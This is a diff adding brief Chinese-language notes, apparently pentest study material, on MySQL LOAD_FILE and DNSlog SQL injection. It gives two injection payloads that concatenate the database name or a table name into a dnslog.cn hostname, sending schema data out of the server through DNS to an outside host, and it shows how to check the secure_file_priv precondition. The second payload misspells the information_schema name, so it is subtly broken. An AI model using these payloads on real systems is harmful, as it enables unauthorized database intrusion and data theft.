@@ -1,0 +1,19 @@
+
+LOAD_FILE(file_name) 
+读取一个文件并将其内容作为字符串返回。
+
+前提
+secure_file_priv=（开启状态）
+
+show global variables like '%secure%';
+
+配置：my.ini
+
+and (select load_file(concat('//',(select database()),'.bxvt0h.dnslog.cn/abc'))) -- qwe
+
+
+
+DNSlog注入
+
+
+(select load_file(concat('//',(select table_name from information.schema.tables where table_schema=database() limit 1,1),'.gst51b.dnslog.cn/abc'))) -- qwe
